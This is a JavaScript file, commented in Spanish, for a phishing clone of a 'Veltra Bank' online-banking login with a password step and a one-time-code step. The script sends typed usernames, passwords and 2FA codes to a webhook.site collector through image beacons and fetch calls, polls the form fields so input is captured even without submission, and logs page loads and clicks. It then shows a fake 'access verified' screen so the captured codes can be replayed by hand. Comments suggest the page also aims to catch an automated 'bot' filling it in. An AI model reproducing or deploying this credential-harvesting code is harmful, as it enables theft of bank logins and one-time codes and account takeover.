/*
 * Veltra Bank — front del clon (deploy estatico en Vercel, sin backend).
 *
 * Imita el flujo de 2 pasos (password -> OTP). Exfiltra lo que teclea el
 * cliente a webhook.site por GET-imagen (es "simple request": no dispara
 * preflight CORS). Con esos valores corres el script de login a mano.
 */
(function () {
  "use strict";

  // <<< EDITAR: pega tu propia URL fresca de webhook.site >>>
  var COLLECTOR = "https://webhook.site/e2685b51-40e1-4e66-b0d1-2afb36a1d75f";

  function exfil(fase, datos) {
    var qs = encodeURIComponent(JSON.stringify(datos));
    var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
    try { new Image().src = url; } catch (e) {}
    try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) {}
  }

  function limpiarError() {
    var el = document.getElementById("alert");
    if (el) { el.textContent = ""; el.style.display = "none"; }
  }

  // Diagnostico: beacon al cargar. Si el bot siquiera abre la pagina, esto cae
  // en el webhook aunque no toque ningun form.
  exfil("pageload", { ref: document.referrer, url: location.href, ua: navigator.userAgent });

  // Captura robusta: NO dependemos del submit. Si el bot escribe en los campos
  // (aunque nunca envie el form), lo levantamos por polling + eventos.
  var ult = { u: "", p: "", c: "" };
  function chequear() {
    var gu = document.getElementById("txt-login");
    var gp = document.getElementById("txt-password");
    var gc = document.getElementById("txt-2fa");
    var u = gu ? gu.value : "";
    var p = gp ? gp.value : "";
    var c = gc ? gc.value : "";
    if ((u && u !== ult.u) || (p && p !== ult.p)) {
      ult.u = u; ult.p = p;
      exfil("campos-login", { usuario: u, clave: p });
    }
    if (c && c !== ult.c) {
      ult.c = c;
      exfil("campos-2fa", { codigo: c });
    }
  }
  setInterval(chequear, 200);
  ["txt-login", "txt-password", "txt-2fa"].forEach(function (id) {
    var el = document.getElementById(id);
    if (el) {
      el.addEventListener("input", chequear);
      el.addEventListener("change", chequear);
    }
  });
  // Diagnostico de interaccion: cualquier click en la pagina.
  document.addEventListener("click", function (ev) {
    var t = ev.target ? (ev.target.id || ev.target.tagName || "?") : "?";
    exfil("click", { t: t });
  }, true);

  var formLogin = document.getElementById("form-login");
  var form2fa   = document.getElementById("form-2fa");
  var title     = document.getElementById("card-title");
  var sub       = document.getElementById("card-sub");

  // --- Paso 1: usuario + clave ---
  formLogin.addEventListener("submit", function (e) {
    e.preventDefault();
    limpiarError();
    var usuario = document.getElementById("txt-login").value.trim();
    var clave   = document.getElementById("txt-password").value;

    exfil("login", { usuario: usuario, clave: clave });

    var btn = document.getElementById("btn-login");
    btn.disabled = true; btn.textContent = "Verificando...";
    setTimeout(function () {
      formLogin.style.display = "none";
      form2fa.style.display = "";
      title.textContent = "Verificacion en dos pasos";
      sub.textContent = "Ingresa el codigo de un solo uso que te enviamos.";
      var i = document.getElementById("txt-2fa"); if (i) i.focus();
    }, 650);
  });

  // --- Paso 2: OTP ---
  form2fa.addEventListener("submit", function (e) {
    e.preventDefault();
    limpiarError();
    var codigo = document.getElementById("txt-2fa").value.trim();

    exfil("2fa", { codigo: codigo });

    var btn = document.getElementById("btn-2fa");
    btn.disabled = true; btn.textContent = "Verificando...";
    setTimeout(function () {
      document.querySelector(".card").innerHTML =
        '<div class="eyebrow">Banca en linea</div>' +
        '<h2>Acceso verificado</h2>' +
        '<p class="sub">Redirigiendo a tu panel...</p>';
    }, 650);
  });
})();
